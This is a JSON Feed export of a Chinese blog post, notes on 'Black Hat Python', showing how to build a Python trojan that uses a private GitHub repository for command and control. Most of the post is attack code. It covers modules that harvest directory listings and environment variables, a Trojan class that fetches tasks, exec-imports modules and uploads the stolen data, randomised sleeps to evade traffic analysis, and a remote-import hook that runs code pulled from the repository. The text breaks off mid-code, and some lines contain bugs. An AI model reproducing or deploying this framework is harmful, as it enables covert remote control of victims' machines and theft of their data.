{
    "version": "https://jsonfeed.org/version/1",
    "title": "Or0kit • All posts by \"python的import功能\" tag",
    "description": "临渊羡鱼，不如退而结网",
    "home_page_url": "https://Or0kit.github.io",
    "items": [
        {
            "id": "https://or0kit.github.io/Programming/Python/%E5%9F%BA%E4%BA%8EGithub%E6%9C%8D%E5%8A%A1%E7%9A%84C&C%E9%80%9A%E4%BF%A1/",
            "url": "https://or0kit.github.io/Programming/Python/%E5%9F%BA%E4%BA%8EGithub%E6%9C%8D%E5%8A%A1%E7%9A%84C&C%E9%80%9A%E4%BF%A1/",
            "title": "基于Github服务的C&C通信",
            "date_published": "2022-05-04T06:11:30.000Z",
            "content_html": "<h1 id=\"楔子\"><a class=\"anchor\" href=\"#楔子\">#</a> 楔子</h1>\n<p>看了 Python 黑帽子一书，记一下笔记。</p>\n<h1 id=\"正文\"><a class=\"anchor\" href=\"#正文\">#</a> 正文</h1>\n<p>想要开发一套实用的木马框架，最大的挑战之一是设计合理的控制、更新和传输数据的方案。</p>\n<h2 id=\"基于github服务的cc通信\"><a class=\"anchor\" href=\"#基于github服务的cc通信\">#</a> 基于 Github 服务的 C&amp;C 通信</h2>\n<p>本章利用 Github 作为存放木马配置、窃取受害者系统数据的通道，并且将木马执行任务所需的所有模块都托管在 Github 上。</p>\n<p>“魔改” Python 原生的导入机制，这样创建新的木马模块后，木马就能自动从仓库里直接拉取这些模块以及任何需要依赖的第三方库</p>\n<p>好处：</p>\n<ol>\n<li>和 Github 之间的通信流量都是经过 SSL 加密的。</li>\n<li>公司内网一般不会禁用 Github。</li>\n</ol>\n<p>使用私有仓库，以防有人窥探我们的行动。</p>\n<h3 id=\"第一步\"><a class=\"anchor\" href=\"#第一步\">#</a> 第一步</h3>\n<details class=\"info\"><summary>创建Github仓库</summary><div>\n<p>注册 Github 账号就不说了，创建一个名字叫  <code>bhptrojan</code>  的新仓库。</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>安装 python 版本的 Github API 库：  <code>pip3 install github3.py</code></p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<p>在本地创建这个仓库的基本结构。在命令行中输入以下内容：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mkdir</span> bhptrojan</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">cd</span> bhptrojan</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">git</span> init</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">mkdir</span> modules</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">mkdir</span> config</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">mkdir</span> data</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">touch</span> .gitignore</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">git</span> <span class=\"token function\">add</span> <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">git</span> commit -m <span class=\"token string\">\"Adds repo structure for trojan.\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">git</span> remote <span class=\"token function\">add</span> origin https://github.com/<span class=\"token operator\">&lt;</span>YourUserName<span class=\"token operator\">></span>/bhptrojan.git</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">git</span> push origin master</pre></td></tr></table></figure><p><img data-src=\"image003.png\" alt=\"\" /></p>\n<p>可能需要科学上网！</p>\n<p>这样就创建了仓库的初始结构。<br />\n其中  <code>config</code>  目录存放这每种木马独有的配置文件。这样部署木马时，你会希望每种木马执行不同的任务，所以每种木马应该检查各自的配置文件。<br />\n <code>modules</code>  目录存放这各种模块可供木马选用。我们会修改 Python 的导入机制，让木马能够从 GitHUb 仓库里直接导入这些模块。<br />\n有了这种远程导入能力，你就能通过 GitHub 下发各种第三方库，避免每次添加新功能或依赖时都重新编译打包可执行木马文件。<br />\n最后  <code>data</code>  目录则是木马用来上交它们收集到的数据的地方。</p>\n<p>也可以创建一个 GitHub 个人访问令牌，当通过 HTTPS 与 GItHub API 交互时，可以用令牌代替你的密码。<br />\n这个书中让参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vZW4vYXV0aGVudGljYXRpb24=\">https://docs.github.com/en/authentication</span></p>\n<p>创建完令牌后保存在 mytoken.txt 中。记得添加到  <code>.gitignore</code>  中，这样就不会把身份凭证推送到仓库里了。</p>\n</div></details>\n<h3 id=\"第二步\"><a class=\"anchor\" href=\"#第二步\">#</a> 第二步</h3>\n<details class=\"info\"><summary>编写一些简单的模块</summary><div>\n<p>在  <code>module</code>  文件夹下创建两个模块一个为  <code>dirlister.py</code> ，另一个为  <code>environment.py</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2Rpcmxpc3Rlci5weQ==\">dirlister.py</span>:</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token operator\">**</span>args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    会把当前目录下所有文件列出来，并将一个结果拼成一个字符串返回。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] In dirlister module.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    files <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>listdir<span class=\"token punctuation\">(</span><span class=\"token string\">\".\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>files<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token operator\">**</span>args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    这个模块仅仅收集远程设备上所设定的所有环境变量</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] In environment module.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> os<span class=\"token punctuation\">.</span>environ</pre></td></tr></table></figure><p>开发的每个模块都应该提供一个接受若干个参数的 run 函数，这样技能以一个相对统一的形式来加载每个模块，又能通过定制配置文件给每个模块传递不同的参数。</p>\n<p>接下了将这些代码推到 GitHub 仓库上，以便木马使用。</p>\n<p>执行一下命令：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">git</span> <span class=\"token function\">add</span> <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">git</span> commit -m <span class=\"token string\">\"Add new modules.\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">git</span> push origin master</pre></td></tr></table></figure><p>可以看到代码被推到 GitHub 仓库里了。</p>\n<p>这就是开发木马的工作流程，可以添加一些更复杂的木马模块，巩固所学。</p>\n</div></details>\n<h3 id=\"第三步\"><a class=\"anchor\" href=\"#第三步\">#</a> 第三步</h3>\n<details class=\"info\"><summary>编写木马配置文件</summary><div>\n<p>我们会设定让每个木马去检查  <code>config</code>  目录中的  <code>TROJANID.json</code>  文件，它是一个简单的 JSON 文档，可以解析它、把它转换成 Python 字典，然后根据里面的信息操控木马的行为。</p>\n<p>在 <code>config</code>  目录下创建一个 <code>abc.json</code> , 并输入以下内容:</p>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token property\">\"module\"</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"dirlister\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token property\">\"module\"</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"environment\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>这里只是简单列出了木马应该运行那些模块。</p>\n<p>当然这里也可以添加一些额外的使用选项，比如模块执行的时间、模块的执行次数，或是传递给模块的参数。</p>\n<p>然后在主仓库目录下执行一下命令：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">git</span> <span class=\"token function\">add</span> <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">git</span> commit -m <span class=\"token string\">\"Add simple configuration.\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">git</span> push origin master</pre></td></tr></table></figure></div></details>\n<h3 id=\"第四步\"><a class=\"anchor\" href=\"#第四步\">#</a> 第四步</h3>\n<details class=\"info\"><summary>构建基于GitHub通信的木马</summary><div>\n<p>木马主体会从 GitHub 获取配置信息和要执行的代码。<br />\n首先我们先编写一批函数用于连接、鉴权以及调用 GitHub API。新建一个文件明明为： <code>git_trojan.py</code></p>\n<p>先包含必要的库：</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> github3</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> importlib</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> json</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">from</span> datetime <span class=\"token keyword\">import</span> datetime</pre></td></tr></table></figure><p>编写与木马相关的 GitHub 代码：</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">github_connect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'mytoken.txt'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        token <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    user <span class=\"token operator\">=</span> <span class=\"token string\">'tiarno'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    sess <span class=\"token operator\">=</span> github3<span class=\"token punctuation\">.</span>login<span class=\"token punctuation\">(</span>token<span class=\"token operator\">=</span>token<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> sess<span class=\"token punctuation\">.</span>repository<span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">,</span> <span class=\"token string\">'bhptrojan'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_file_contents</span><span class=\"token punctuation\">(</span>dirname<span class=\"token punctuation\">,</span>module_name<span class=\"token punctuation\">,</span>repo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> repo<span class=\"token punctuation\">.</span>file_contents<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>dirname<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">/</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>module_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这两个函数会处理和 GitHub 仓库之间的交互。</p>\n<p><code>github_connect</code>  函数会读取在 GitHub 上创建的令牌。<br />\n在创建令牌时，将它保存到了一个名为  <code>mytoken.txt</code>  的文件中。<br />\n现在我们该从改文件中读取令牌，并创建一个  <code>GitHub</code>  仓库连接。<br />\n我们可以给不同的木马创建不同的令牌，这样就能控制每个木马有权访问哪些数据。即使受害者捕获了木马，也无法溯源并删除你的所有数据。</p>\n<p><code>get_file_contents</code>  函数会接受文件名、模块名以及一个 GitHub 连接作为参数，并返回相应模块的内容。<br />\n这个函数负责从远处仓库里抓取文件并读取里面的数据。我们会用它读取配置文件和模块源代码。</p>\n<p>现在我们来编写 Trojan 类，它负责执行基本的木马任务：</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Trojan</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> <span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        初始化木马对象，设定好它的配置文件和数据目录路径（用于上报木马的输出结果），然后连接GitHub仓库。</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        \"\"\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        self<span class=\"token punctuation\">.</span><span class=\"token builtin\">id</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">id</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        self<span class=\"token punctuation\">.</span>config_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.json'</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        self<span class=\"token punctuation\">.</span>data_path <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'data/</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">/'</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        self<span class=\"token punctuation\">.</span>repo <span class=\"token operator\">=</span> github_connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>下面编写和 GitHub 仓库通信时所需的函数：</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_config</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    从仓库中读取远程配置文件，这样木马就知道该运行那些模块，并通过调用exec函数将模块内容引入木马对象。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    config_json <span class=\"token operator\">=</span> get_file_contents<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token string\">'config'</span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>config_file<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>repo</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    config <span class=\"token operator\">=</span> json<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>config_json<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span> task <span class=\"token keyword\">in</span> config<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> task<span class=\"token punctuation\">[</span><span class=\"token string\">'module'</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> sys<span class=\"token punctuation\">.</span>modules<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"import %s\"</span> <span class=\"token operator\">%</span> task<span class=\"token punctuation\">[</span><span class=\"token string\">'module'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">return</span> config</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">module_runner</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> module<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    函数会调用刚才所引入模块的run函数。</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    result <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>modules<span class=\"token punctuation\">[</span>module<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    self<span class=\"token punctuation\">.</span>store_module_result<span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">store_module_result</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    函数会创建一个文件，其文件名包含当前日期和时间，然后将模块的输出结果存在这个文件中。</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    message <span class=\"token operator\">=</span> datetime<span class=\"token punctuation\">.</span>now<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>isformat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    remote_path <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'data/</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>self<span class=\"token punctuation\">.</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">/</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>message<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.data'</span></span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    bindata <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token string\">'%r'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">,</span> <span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    self<span class=\"token punctuation\">.</span>repo<span class=\"token punctuation\">.</span>create_file<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        remote_path<span class=\"token punctuation\">,</span> message<span class=\"token punctuation\">,</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>bindata<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>我们的木马会利用这个三个函数，把从目标设备上收集到的数据推送到 GitHub 上。</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    执行任务</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\"># 从仓库中拉取配置文件</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        config <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>get_config<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">for</span> task <span class=\"token keyword\">in</span> config<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token comment\"># 把模块交给一个独立的线程去执行。</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            thread <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                target<span class=\"token operator\">=</span>self<span class=\"token punctuation\">.</span>module_runner<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>task<span class=\"token punctuation\">[</span><span class=\"token string\">'module'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            thread<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">30</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>在 run 函数中，我们开始执行这些任务。</p>\n<p>进入 module_runner 函数后，我们调用模块的 run 函数执行之中的代码。当它执行结束后，应该会输出一个字符串，我们会把这个字符串推送到 GitHub 上。</p>\n<p>每执行完一个任务，木马安都会随机休眠一段时间，以尝试绕过防守方的流量特征分析。当然也可以创建一堆指向 Google 的流量，回事访问一些正常网站，以此来伪装木马。</p>\n</div></details>\n<h3 id=\"第五步\"><a class=\"anchor\" href=\"#第五步\">#</a> 第五步</h3>\n<details class=\"info\"><summary>深入探索Python的import功能</summary><div>\n<p>在我们操纵的远程设备上难免会用到这个设备上不存在的包，然而远程安装软件包是件很麻烦的事。<br />\n除此之外，我们还希望每次添加一项依赖（比如 scapy）之后，可以确保每个模块都能用上这个依赖。</p>\n<p>Python 允许我们改动导入模块的过程，如果没能在本地找到某个模块，就会调用我们定义的 import 类，这样就能从我们的仓库远程拉取代码。<br />\n我们要把编写的这个类添加到  <code>sys.meta_path</code>  列表中。</p>\n<p>现在构建这个类：</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">GitImporter</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        self<span class=\"token punctuation\">.</span>current_module_code <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">find_module</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> path<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] Attempting to retrieve %s\"</span> <span class=\"token operator\">%</span> name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        self<span class=\"token punctuation\">.</span>repo <span class=\"token operator\">=</span> github_connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        new_library <span class=\"token operator\">=</span> get_file_contents<span class=\"token punctuation\">(</span><span class=\"token string\">'modules'</span><span class=\"token punctuation\">,</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.py'</span></span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>repo<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">if</span> new_library <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            self<span class=\"token punctuation\">.</span>current_module_code <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span 